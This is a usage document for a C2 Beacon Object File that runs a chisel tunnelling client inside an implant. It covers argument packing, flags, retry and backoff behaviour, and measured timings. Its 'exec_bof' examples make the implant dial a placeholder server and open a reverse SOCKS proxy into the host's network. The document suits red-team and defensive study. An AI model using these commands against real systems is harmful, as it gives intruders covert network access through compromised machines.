# Usage: arguments, flags, and what the retry knobs actually cost

The [README](../README.md) has the short form (build, run, remote syntax, flag list, deployment,
shape). This file has the reasoning, the full flag cells, and the measured timings.

## The two ways to hand over arguments

The DLL exports `go(const char *args, int len)` taking Beacon-packed string arguments (`z` format,
entry point `go`): the server URL, then the remote list, then flags. Always `https://` (or `wss://`)
— the transport is TLS, so `ws://`/`http://` is not useful. In the OST web UI this is the implant's
**Execute BOF** task: artifact `chiselbof.dll`, entry point `go`, format string `zz`, then the URL
and the remote; the async variant keeps the beacon thread free.

### Records, dashes optional

```
exec_bof zzzzzz https://chisel.example.com R:1080:socks auth ops:pass keepalive 30s ping-timeout 10s
```

`auth`, `-auth` and `--auth` are the same flag; the name after the dashes must match exactly, so
`authx` matches nothing. The dash-free spelling is not sugar: OST's `exec_bof <types><args>` is a
positional parser that hands any token starting with `-` to its own option parser, so a dashed flag
can never reach the packed argument buffer there (`unrecognized arguments: --auth`). On a C2 whose
BOF loader does pass dashes through, the dashed record form works unchanged.

### One record holding the whole command line

```
exec_bof z "https://chisel.example.com R:1080:socks --auth ops:pass --keepalive 30s --max-retry-count 5"
```

Dashes are legal here because the **payload**, not the C2, splits the string: on ASCII blanks, with
`"` grouping a value that contains a space (the quote characters are dropped). No `z`-counting, no
renaming of flags — whatever `chisel client` line works upstream fits in one string. This path is
taken only when the buffer holds exactly **one** record, so it cannot be confused with the record
form (which always needs at least a URL and a remote).

## Flags in detail

Names and defaults match the Go client's flags and env vars, so a working `chisel client` command
line transfers over unchanged.

| flag | default | what it does (upstream equivalent) |
|---|---|---|
| `--auth <user>:<pass>` | none | Authenticates to the server. Split at the **first** colon, so the password may contain colons. This is chisel's SSH-level auth: the payload sends `USERAUTH_REQUEST` method `password` (after a `none` probe) and the server checks it in `PasswordCallback` (`server/server.go:authUser`), which is also how `--authfile` per-user address allow-lists are keyed. A rejected credential ends the session and the client retries with backoff — the server logs `Login failed for user "<name>"`. |
| `--keepalive <dur>` | `25s` | How often **this client** sends the SSH global request `ping` and waits for the `pong` reply (`--keepalive 0s` disables our pings; the server's own pings are still answered). Matches `Config.KeepAlive` in the Go client, whose tunnel runs the same keepalive loop on both ends. |
| `--ping-timeout <dur>` | = keepalive | How long to wait for that `pong` before declaring the tunnel dead and redialing (chisel's `PING_TIMEOUT`). This is what detects a *black-holed* path — front-end idle drop, NAT expiry, sleep/wake — where the TCP socket stays open and no byte ever arrives. |
| `--connect-timeout <dur>` | `8s` | Dial deadline (non-blocking `connect` + `select`, confirmed with `SO_ERROR`), applied to the server socket and to every proxied target. |
| `--ws-timeout <dur>` | `45s` | Deadline for the TLS handshake **and** the WebSocket upgrade read (chisel's `WS_TIMEOUT`). |
| `--ssh-timeout <dur>` | `30s` | Deadline for the SSH handshake, userauth and the `config` request (chisel's `SSH_TIMEOUT`). |
| `--min-retry-interval <dur>` | `1s` | Lower bound of the reconnect backoff. |
| `--max-retry-interval <dur>` | `5m` | Upper bound of the reconnect backoff. |
| `--max-retry-count <n>` | unlimited | Give up (return to the beacon) after `n` failed attempts. `0` and any negative value mean **unlimited**, exactly like chisel, whose gate is `MaxRetries > 0`. Attempts are counted per failed session and **reset once a connection has stayed up for more than 5 s** (chisel's `connected` rule), so a long-lived proxy never accumulates a budget that eventually kills it. |

Durations use chisel's own syntax — `500ms`, `30s`, `5m`, `1h`. A bare number means seconds, which
`chisel` itself rejects; the payload accepts it.

The payload's own knobs, not chisel's: `--port <p>` (server port, if the URL has none),
`--listen <p>` (socks bind port when the remote spells it without a port; default 1080),
`--tgt <A.B.C.D[:port]>` (destination for SOCKS `CONNECT`s that arrive without an address),
`--ver <string>` (version reported in the `config` request), `--hv <n>` (KEX version-string shape,
for handshake experiments).

## Backoff, and how long giving up takes

Backoff is chisel's (`jpillora/backoff`, jitter on, factor 2): the wait for attempt *n* is uniform
in `[min, min·2ⁿ]`, capped at `max-retry-interval`. One measured run on the defaults gave
`1000, 1726, 3541, 7004, 7233, 2422, 5292 ms` (jittered, so the numbers move run to run); the
stable part is the envelope and the wall clock: those 7 waits (28 s) plus 8 dial deadlines (8 s
each) came out at 93 s, which is what the process actually took.

A front end that answers `502/503/421` because the backend behind it restarted is treated as a
session death, so the client backs off and keeps trying instead of burning a fixed budget.

How long "give up and return to the beacon" takes, measured on the test box (walls are the whole
run: attempts + the backoff waits; `min == max` collapses the jitter band so the numbers are
repeatable):

| what is wrong | flags on the command line | wall |
|---|---|---|
| nothing listening at the port | `max-retry-count 5 min-retry-interval 2s max-retry-interval 2s connect-timeout 1s` | 13 s |
| same, default dial deadline (8 s) | `max-retry-count 5 min-retry-interval 2s max-retry-interval 2s` | 49 s |
| front end answers TLS then `502` (backend down) | `max-retry-count 3 min-retry-interval 2s max-retry-interval 2s connect-timeout 3s ws-timeout 3s ssh-timeout 3s` | 4 s |
| path black-holed mid-handshake (TLS never answers) | `max-retry-count 4 min-retry-interval 1s max-retry-interval 1s connect-timeout 1s ws-timeout 1s ssh-timeout 1s` | 7 s |
| never give up | `max-retry-count 0` (or omit it) | unlimited |

The second row is why `connect-timeout` matters more than the retry flags: when the path is
filtered rather than refused, every attempt spends the full dial deadline before the backoff wait
even starts. Note also that a printed `waiting N ms` line is not proof that the wait happened —
the wait had to be re-measured against a wall clock, which is what found that the original
`select(0,0,0,0,&tv)` sleep is rejected by Winsock. See
[docs/build-problems.md](build-problems.md) and [stability-invariants.md](stability-invariants.md).

## How the packed buffer is parsed

- At most **24** length-prefixed argument records, accepted for `z`, `b` (no NUL terminator) and
  `Z` — UTF-16LE, collapsed to 8-bit **per record** by shape (`pe_iswide`: printable first byte and
  every odd byte zero), because the packed buffer carries no type information. A wide argument that
  is not decoded truncates at its first NUL byte. Mixed `z`/`Z` lists work.
- Each record holds up to **1024** characters, which is what lets the whole command line fit in one
  record.
- A longer list, an unterminated quote, an over-long token or an oversized record makes `go()`
  return **6 without running anything**. Truncation is an error, never a fallback: a truncated list
  would drop `auth` or the timeouts while the proxy still appeared to work, which is exactly the
  failure this used to have (`SO_RCVTIMEO` measured installed at the 45 s default while the command
  line said `3s`, because the flag sat past the old 8-record cap).
- Return codes worth knowing: `1` = flags parsed and the dial budget ran out, `6` = refused
  (arguments), `7` = bad duration, and a run that never returns = unlimited retries. The last one is
  also how the suite proves that per-run state did not leak from the previous run.
- The single-record form is tokenized into at most 24 tokens, same refusal rule.
- The console twin (`-DTWIN_MAIN`, build line in
  [docs/build-problems.md](build-problems.md)) takes real `argv`, so it never hits the record cap —
  which is why that bug only ever showed in the DLL.

`tests/packedargs.py` drives `go()` directly with hand-built buffers — both header forms (CS and
Outflank), `z`/`b`/`Z` records, the single-record command line (dashed, dash-free, quoted value with
a space, unquoted two-token case, unterminated quote, over the token cap), the record cap boundary,
the no-inheritance case, and the **wall clock** of a bounded retry run. 16 cases; see
[tests/README.md](../tests/README.md) §6.

## Watching what the payload is doing

To see the `ping`/`pong` cadence, which phase timed out, or which auth methods the server would
accept: build the console twin, or a `DIAG_MARK` build — [build-problems.md](build-problems.md) and
the diagnostic switches section of [internals.md](internals.md).
